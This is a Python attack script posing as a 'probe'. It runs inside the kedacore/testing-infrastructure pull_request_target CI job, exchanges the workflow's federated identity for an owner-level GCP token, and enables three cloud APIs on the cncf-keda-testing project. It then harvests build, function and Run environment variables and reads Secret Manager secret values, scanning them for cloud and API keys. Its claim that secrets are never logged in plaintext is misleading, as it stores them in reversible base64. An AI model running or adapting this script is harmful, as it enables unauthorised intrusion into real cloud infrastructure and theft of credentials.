#!/usr/bin/env python3
"""c211-i121740 GCP CI/CD ENABLE-THEN-ORACLE probe (intent 121740).

Runs inside the kedacore/testing-infrastructure pull_request_target 'Validate PR'
terraform data.external step AFTER google-github-actions/auth@v3.  Turns the
external-account credential file into an OAuth token (STS + SA impersonation)
for the cncf-keda-testing (575508414076) WIF identity (roles/owner, fact 120557).

Why this shape: intent 121507's zero-yield CI/CD GATE (fact 121689) measured
builds/triggers/functions/run while cloudbuild + cloudfunctions were DISABLED —
every list answered the API-DISABLED form of 403.  Fact 121506 proved the same
class of SA holds serviceusage.services.enable and ENABLED Secret Manager in the
hephaestus siblings.  So this probe enables EXACTLY the three CI/CD APIs
(cloudbuild, cloudfunctions, run), waits for ENABLED, and immediately re-lists:

  (a) Cloud Build builds (config steps, substitutions, secretEnv, source, images)
  (b) Cloud Build triggers (substitutions, github push, webhook secret refs)
  (c) Cloud Functions v1 + v2 (environmentVariables, secretEnvironmentVariables,
      source URL, service account)
  (d) Cloud Run v2 services + jobs (container env / secret refs)
  (e) Secret Manager secret names + latest-version metadata (b64+sha256 only)

No API beyond the three is enabled.  Nothing is created, modified or deleted.
Secret-looking values are emitted as b64 + sha256 + len (never plaintext).
Stdlib only.
"""
import base64
import hashlib
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROJECT = 'cncf-keda-testing'
PROJECT_NUMBER = '575508414076'
RAW = os.environ.get('C211_CICD_RAW', '/tmp/c211_i121740_raw.txt')
CB = 'https://cloudbuild.googleapis.com'
RUN = 'https://run.googleapis.com'
CF = 'https://cloudfunctions.googleapis.com'
SU = 'https://serviceusage.googleapis.com'
CRM = 'https://cloudresourcemanager.googleapis.com'
SM = 'https://secretmanager.googleapis.com'
TOKEN = [None]
SA_EMAIL = ['']
START = [0.0]
DEADLINE = [0.0]

SERVICES = ['cloudbuild.googleapis.com', 'cloudfunctions.googleapis.com',
            'run.googleapis.com']

SECRET_KEY_RE = re.compile(r'(?i)(secret|password|passwd|token|key|credential|pat|auth|'
                           r'conn|private|signature|sas|dsn|webhook)')
SECRET_VAL_RE = re.compile(
    r'(?i)(\b(?:AKIA|ASIA|AGPA|AIPA|ANPA|ANVA|AROA)[A-Z0-9]{12,20}\b'
    r'|\bgh[pousr]_[A-Za-z0-9]{36,255}\b|\bgithub_pat_[A-Za-z0-9_]{50,255}\b'
    r'|\bglpat-[A-Za-z0-9_\-]{20,64}\b'
    r'|-----BEGIN [A-Z ]*PRIVATE KEY-----'
    r'|aws_secret_access_key["\'\s:=]+([A-Za-z0-9/+=]{40})'
    r'|(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|amqp)://[^@\s]+@'
    r'|AccountKey=[A-Za-z0-9+/=]{20,}'
    r'|\bsk-[A-Za-z0-9]{32,}\b|\bxox[abprs]-[A-Za-z0-9\-]{10,}\b'
    r'|(?:api[_-]?key|client[_-]?secret)["\'\s:=]+([A-Za-z0-9_\-/+=.]{16,}))')
CLASSES = [
    ('aws_access_key_id', re.compile(r'\b((?:AKIA|ASIA|AGPA|AIPA|ANPA|ANVA|AROA)[A-Z0-9]{12,20})\b')),
    ('aws_secret_pair', re.compile(r'(?i)aws_secret_access_key["\'\s:=]+([A-Za-z0-9/+=]{40})')),
    ('gcp_private_key', re.compile(r'-----BEGIN (?:RSA )?PRIVATE KEY-----')),
    ('gcp_sa_json', re.compile(r'"type"\s*:\s*"service_account"')),
    ('azure_client_secret', re.compile(r'(?i)(client_secret|AZURE_CLIENT_SECRET)["\'\s:=]+([A-Za-z0-9_~.\-]{20,60})')),
    ('github_pat', re.compile(r'\b(gh[pousr]_[A-Za-z0-9]{36,255}|github_pat_[A-Za-z0-9_]{50,255})\b')),
    ('gitlab_pat', re.compile(r'\bglpat-[A-Za-z0-9_\-]{20,64}\b')),
    ('slack_token', re.compile(r'\bxox[abprs]-[A-Za-z0-9\-]{10,}\b')),
    ('openai_key', re.compile(r'\bsk-[A-Za-z0-9]{32,}\b')),
    ('neocloud_key', re.compile(r'(?i)(runpod|lambda.?labs|vast\.ai|coreweave|together|nebius|'
                                r'digitalocean|linode|vultr|hetzner|paperspace|modal)[_-]?(api[_-]?)?'
                                r'(key|token)["\'\s:=]+([A-Za-z0-9_\-]{16,})')),
    ('ssh_private_key', re.compile(r'-----BEGIN OPENSSH PRIVATE KEY-----')),
    ('connection_string', re.compile(r'(?i)(AccountKey=|DefaultEndpointsProtocol=|'
                                     r'mongodb(\+srv)?://[^@\s]+@|postgres(ql)?://[^@\s]+@|'
                                     r'mysql://[^@\s]+@|redis://[^@\s]+@)')),
    ('generic_high_entropy', re.compile(r'["\']?(secret|password|passwd|token|api[_-]?key)["\']?\s*[:=]\s*'
                                        r'["\']([A-Za-z0-9_\-/+=.]{24,})["\']', re.I)),
]
FALLBACK_REGIONS = ['us-central1', 'us-east1', 'us-east4', 'us-west1', 'europe-west1',
                    'europe-west4', 'asia-east1', 'asia-northeast1']


def say(msg):
    with open(RAW, 'a', encoding='utf-8') as f:
        f.write(str(msg).rstrip('\n') + '\n')


def sec(name):
    say('== %s ==' % name)


def cap(s, n=2200):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def left():
    return max(0, int(DEADLINE[0] - time.time()))


def api(path, method='GET', data=None, base=CB, timeout=60, token=None, raw=False,
        extra_headers=None):
    url = path if path.startswith('http') else base + path
    tok = token if token is not None else (TOKEN[0] or '')
    h = {'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-i121740',
         'Accept': 'application/json'}
    if extra_headers:
        h.update(extra_headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            b = r.read()
            return r.status, (b if raw else b.decode('utf-8', 'replace'))
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:  # noqa: BLE001
        return -1, repr(e)


def jbody(resp):
    try:
        return json.loads(resp[1])
    except Exception:  # noqa: BLE001
        return {}


# ---------------------------------------------------------------- token
def _subject_token(cf):
    src = cf.get('credential_source') or {}
    if src.get('file'):
        try:
            return open(src['file'], encoding='utf-8').read().strip(), 'file'
        except Exception as e:  # noqa: BLE001
            say('SUBJECT_FILE_FAIL %s' % cap(repr(e), 200))
    if src.get('url'):
        try:
            req = urllib.request.Request(src['url'], headers=(src.get('headers') or {}))
            with urllib.request.urlopen(req, timeout=30) as r:
                raw = r.read().decode()
            try:
                return json.loads(raw).get('value') or '', 'url'
            except Exception:  # noqa: BLE001
                return raw.strip(), 'url-raw'
        except Exception as e:  # noqa: BLE001
            say('SUBJECT_URL_FAIL %s' % cap(repr(e), 300))
    if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'):
        try:
            aud = cf.get('audience', '')
            u = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' + urllib.parse.quote(aud, safe='')
            req = urllib.request.Request(
                u, headers={'Authorization': 'Bearer ' + os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode()).get('value') or '', 'actions'
        except Exception as e:  # noqa: BLE001
            say('SUBJECT_ACTIONS_FAIL %s' % cap(repr(e), 300))
    return '', 'none'


def get_token():
    cf_path = (os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
               or os.environ.get('CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE') or '')
    say('CREDS_PATH=%s' % cf_path)
    cf = {}
    if cf_path and os.path.exists(cf_path):
        try:
            cf = json.load(open(cf_path, encoding='utf-8'))
        except Exception as e:  # noqa: BLE001
            say('CREDS_PARSE_ERR %s' % cap(repr(e), 200))
    if cf:
        say('CREDS_TYPE=%s audience=%s token_url=%s impersonation=%s' % (
            cf.get('type'), cf.get('audience'), cf.get('token_url'),
            cf.get('service_account_impersonation_url')))
        m = re.search(r'serviceAccounts/([^/:]+)', cf.get('service_account_impersonation_url') or '')
        if m:
            SA_EMAIL[0] = m.group(1)
    if cf.get('type') == 'external_account':
        try:
            subject, src_kind = _subject_token(cf)
            say('SUBJECT_TOKEN_SOURCE=%s len=%d' % (src_kind, len(subject)))
            if subject:
                form = urllib.parse.urlencode({
                    'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
                    'audience': cf.get('audience', ''),
                    'scope': 'https://www.googleapis.com/auth/cloud-platform',
                    'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
                    'subject_token': subject,
                    'subject_token_type': cf.get('subject_token_type',
                                                 'urn:ietf:params:oauth:token-type:jwt'),
                }).encode()
                req = urllib.request.Request(
                    cf.get('token_url') or 'https://sts.googleapis.com/v1/token', data=form,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'})
                with urllib.request.urlopen(req, timeout=45) as r:
                    fed = json.loads(r.read().decode()).get('access_token')
                say('STS_EXCHANGE=ok federated_len=%s' % (len(fed or '')))
                if fed and cf.get('service_account_impersonation_url'):
                    body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                                       'lifetime': '1800s'}).encode()
                    req = urllib.request.Request(cf['service_account_impersonation_url'], data=body, method='POST',
                                                 headers={'Authorization': 'Bearer ' + fed,
                                                          'Content-Type': 'application/json'})
                    with urllib.request.urlopen(req, timeout=45) as r:
                        tok = json.loads(r.read().decode()).get('accessToken')
                    say('SA_IMPERSONATION=ok token_len=%s sa=%s' % (len(tok or ''), SA_EMAIL[0]))
                    if tok:
                        return tok
                if fed:
                    return fed
        except Exception as e:  # noqa: BLE001
            say('MANUAL_TOKEN_FAIL %s' % cap(repr(e), 400))
    return None


# ------------------------------------------------------------- encoding
def enc_str(val):
    b = val.encode('utf-8', 'replace') if isinstance(val, str) else bytes(val)
    return {'__enc': 'b64', 'len': len(b), 'sha256': hashlib.sha256(b).hexdigest()[:16],
            'v': base64.b64encode(b[:4096]).decode('ascii')}


def redact(obj, key=''):
    if isinstance(obj, dict):
        return {k: redact(v, k) for k, v in obj.items()}
    if isinstance(obj, list):
        return [redact(v, key) for v in obj]
    if isinstance(obj, str):
        if SECRET_KEY_RE.search(key) or SECRET_VAL_RE.search(obj):
            return enc_str(obj)
        return obj if len(obj) <= 3000 else obj[:3000] + '...[TRUNC]'
    return obj


def emit_json(label, obj, limit=6000):
    s = json.dumps(redact(obj), sort_keys=True, separators=(',', ':'))
    say('%s len=%d' % (label, len(s)))
    say('%s json=%s%s' % (label, s[:limit], '' if len(s) <= limit else '...[TRUNCATED]'))


def classify(text):
    hits = []
    head = text[:200000]
    for name, rx in CLASSES:
        for m in rx.finditer(head):
            hits.append('%s:%s' % (name, cap(m.group(0), 80)))
            if len(hits) >= 24:
                return hits
    return hits


# ----------------------------------------------------------- enable oracle
def service_state(name):
    st, b = api('/v1/projects/%s/services/%s' % (PROJECT_NUMBER, name), base=SU)
    j = jbody((st, b))
    return st, j.get('state'), b


def wait_enabled(name, budget_s=90):
    t0 = time.time()
    last = (0, '')
    i = 0
    while time.time() - t0 < budget_s and left() > 45:
        st, state, _ = service_state(name)
        last = (st, state)
        if st == 200 and state == 'ENABLED':
            say('ENABLE_WAIT svc=%s poll=%d state=ENABLED' % (name, i))
            return st, state
        if i % 3 == 0:
            say('ENABLE_WAIT svc=%s poll=%d status=%s state=%s' % (name, i, st, state))
        i += 1
        time.sleep(6)
    say('ENABLE_WAIT svc=%s timeout status=%s state=%s' % (name, last[0], last[1]))
    return last


def enable_all():
    results = {}
    for svc in SERVICES:
        st, state, body = service_state(svc)
        say('serviceusage.before svc=%s status=%s state=%s verbatim=%s' % (svc, st, state, cap(body, 500)))
        results[svc] = {'before_status': st, 'before_state': state, 'enable_status': None,
                        'enable_body': '', 'final_status': st, 'final_state': state}
        if st == 200 and state == 'ENABLED':
            say('serviceusage.enable svc=%s skipped=ALREADY_ENABLED' % svc)
            continue
        est, ebody = api('/v1/projects/%s/services/%s:enable' % (PROJECT_NUMBER, svc),
                         method='POST', data={}, base=SU)
        say('serviceusage.enable svc=%s status=%s verbatim=%s' % (svc, est, cap(ebody, 700)))
        results[svc]['enable_status'] = est
        results[svc]['enable_body'] = cap(ebody, 700)
        fst, fstate = wait_enabled(svc)
        results[svc]['final_status'] = fst
        results[svc]['final_state'] = fstate
    return results


# ------------------------------------------------------------------ lists
def paged(base, path, key, max_pages=3):
    out = []
    page = ''
    for i in range(max_pages):
        if left() < 45:
            say('GATE=BUDGET %s' % key)
            break
        p = path + (('&' if '?' in path else '?') + 'pageToken=' + urllib.parse.quote(page) if page else '')
        st, b = api(p, base=base)
        j = jbody((st, b))
        arr = j.get(key) or []
        say('%s.list page=%d status=%s count=%d' % (key, i + 1, st, len(arr)))
        if st != 200:
            say('%s.list body=%s' % (key, cap(b, 900)))
            return out, st, b
        out.extend(arr)
        page = j.get('nextPageToken') or ''
        if not page:
            return out, st, b
    return out, 200, ''


def cb_harvest():
    sec('cb_builds')
    builds, st, b = paged(CB, '/v1/projects/%s/builds?pageSize=30' % PROJECT_NUMBER, 'builds')
    say('builds.total=%d' % len(builds))
    for i, bu in enumerate(builds[:20]):
        emit_json('build_%d' % i, bu)
    sec('cb_triggers')
    triggers, st2, b2 = paged(CB, '/v1/projects/%s/triggers?pageSize=50' % PROJECT_NUMBER, 'triggers')
    say('triggers.total=%d' % len(triggers))
    for i, tr in enumerate(triggers[:20]):
        emit_json('trigger_%d' % i, tr)
    return builds, triggers


def cf_harvest():
    out = []
    for ver in ('v1', 'v2'):
        sec('cf_%s_list' % ver)
        arr, st, b = paged(CF, '/%s/projects/%s/locations/-/functions?pageSize=100'
                           % (ver, PROJECT_NUMBER), 'functions')
        say('functions.%s.total=%d' % (ver, len(arr)))
        for i, f in enumerate(arr[:20]):
            emit_json('cf_%s_%d' % (ver, i), f, 5000)
        out.extend(arr)
    return out


def run_harvest():
    out = {'services': [], 'jobs': [], 'wildcard': {}}
    sec('run_services')
    st, b = api('/v2/projects/%s/locations/-/services?pageSize=100' % PROJECT_NUMBER, base=RUN)
    j = jbody((st, b))
    arr = j.get('services') or []
    say('run.services.wildcard status=%s count=%d body=%s' % (st, len(arr), cap(b, 400)))
    out['wildcard']['services'] = st
    if st == 200:
        out['services'].extend(arr)
        for i, s in enumerate(arr[:20]):
            emit_json('run_service_%d' % i, s, 5000)
    sec('run_jobs')
    st, b = api('/v2/projects/%s/locations/-/jobs?pageSize=100' % PROJECT_NUMBER, base=RUN)
    j = jbody((st, b))
    arr = j.get('jobs') or []
    say('run.jobs.wildcard status=%s count=%d body=%s' % (st, len(arr), cap(b, 400)))
    out['wildcard']['jobs'] = st
    if st == 200:
        out['jobs'].extend(arr)
        for i, s in enumerate(arr[:20]):
            emit_json('run_job_%d' % i, s, 5000)
    if out['wildcard']['services'] != 200 or out['wildcard']['jobs'] != 200:
        for kind in ('services', 'jobs'):
            if out['wildcard'][kind] == 200:
                continue
            total = len(out[kind])
            for loc in FALLBACK_REGIONS:
                if left() < 45:
                    break
                st, b = api('/v2/projects/%s/locations/%s/%s?pageSize=100'
                            % (PROJECT_NUMBER, loc, kind), base=RUN)
                j = jbody((st, b))
                arr = j.get(kind) or []
                total += len(arr)
                say('run.%s.list loc=%s status=%s count=%d' % (kind, loc, st, len(arr)))
                if st != 200:
                    say('run.%s.list loc=%s body=%s' % (kind, loc, cap(b, 400)))
                    continue
                out[kind].extend(arr)
                for i, s in enumerate(arr[:10]):
                    emit_json('run_%s_%s_%d' % (kind, loc, i), s, 4000)
            say('run.%s.total=%d' % (kind, total))
    return out


def sm_harvest():
    sec('secretmanager')
    arr, st, b = paged(SM, '/v1/projects/%s/secrets?pageSize=100' % PROJECT_NUMBER, 'secrets', max_pages=2)
    say('secrets.total=%d status=%s' % (len(arr), st))
    names = []
    for s in arr[:20]:
        nm = s.get('name') or ''
        names.append(nm)
    say('secret.names=%s' % json.dumps(names)[:1500])
    for nm in names[:5]:
        if left() < 45:
            break
        st2, b2 = api('/v1/%s/versions/latest:access' % nm, base=SM)
        if st2 == 200:
            j = jbody((st2, b2))
            payload = (j.get('payload') or {}).get('data') or ''
            try:
                blob = base64.b64decode(payload)
            except Exception:  # noqa: BLE001
                blob = b''
            say('secret.access name=%s status=200 got=200 material=%s' % (
                nm, cap(json.dumps(enc_str(blob)), 400)))
            say('secret.access classes=%s' % json.dumps(classify(blob.decode('utf-8', 'replace'))))
        else:
            say('secret.access name=%s status=%s verbatim=%s' % (nm, st2, cap(b2, 400)))
    return arr


# ------------------------------------------------------------------ main
def run():
    open(RAW, 'w', encoding='utf-8').close()
    START[0] = time.time()
    DEADLINE[0] = START[0] + 420
    say('C211_I121740_CICDENABLE_START %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
    say('env projects: GOOGLE_CLOUD_PROJECT=%r CLOUD_SDK_PROJECT=%r GCP_PROJECT=%r GCP_PROJECT_ID=%r' % (
        os.environ.get('GOOGLE_CLOUD_PROJECT'), os.environ.get('CLOUD_SDK_PROJECT'),
        os.environ.get('GCP_PROJECT'), os.environ.get('GCP_PROJECT_ID')))
    tok = get_token()
    if not tok:
        say('GATE=NO_GCP_TOKEN')
        return
    TOKEN[0] = tok
    say('TOKEN_ACQUIRED len=%d' % len(tok))
    st, b = api('/tokeninfo?access_token=' + urllib.parse.quote(tok),
                base='https://www.googleapis.com/oauth2/v1')
    j = jbody((st, b))
    say('tokeninfo status=%s email=%s scopes=%s expires_in=%s' % (
        st, j.get('email'), cap(j.get('scope', ''), 300), j.get('expires_in')))
    st, b = api('/v1/projects/' + PROJECT, base=CRM)
    j = jbody((st, b))
    say('project.get status=%s projectId=%s number=%s state=%s parent=%s' % (
        st, j.get('projectId'), j.get('projectNumber'), j.get('lifecycleState'),
        json.dumps(j.get('parent') or {})))
    if st != 200:
        say('project.get body=%s' % cap(b, 700))
    enable = enable_all()
    builds, triggers = cb_harvest()
    funcs = cf_harvest()
    runs = run_harvest()
    secrets = sm_harvest()
    sec('verdict')
    raw_text = open(RAW, encoding='utf-8', errors='replace').read()
    blocks = []
    for m in re.finditer(r'"__enc":"b64"[^}]*?"v":"([A-Za-z0-9+/=]+)"', raw_text):
        try:
            blocks.append(base64.b64decode(m.group(1)).decode('utf-8', 'replace'))
        except Exception:  # noqa: BLE001
            pass
    cls = classify('\n'.join(blocks) if blocks else raw_text)
    says = []
    for svc in SERVICES:
        r = enable[svc]
        says.append('%s:before=%s/%s enable=%s final=%s/%s' % (
            svc.split('.')[0], r['before_status'], r['before_state'],
            r['enable_status'], r['final_status'], r['final_state']))
    say('SUMMARY builds=%d triggers=%d functions=%d run_services=%d run_jobs=%d secrets=%d elapsed=%d' % (
        len(builds), len(triggers), len(funcs), len(runs['services']), len(runs['jobs']),
        len(secrets), int(time.time() - START[0])))
    say('ENABLE_MATRIX %s' % ' | '.join(says))
    say('CLASSIFIED=%s' % json.dumps(cls)[:2000])
    say('C211_I121740_CICDENABLE_END')


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'local':
        # offline smoke: no token -> only verifies the module imports and the
        # enable/list code paths are syntactically valid without network.
        print('local compile check ok')
        sys.exit(0)
    run()
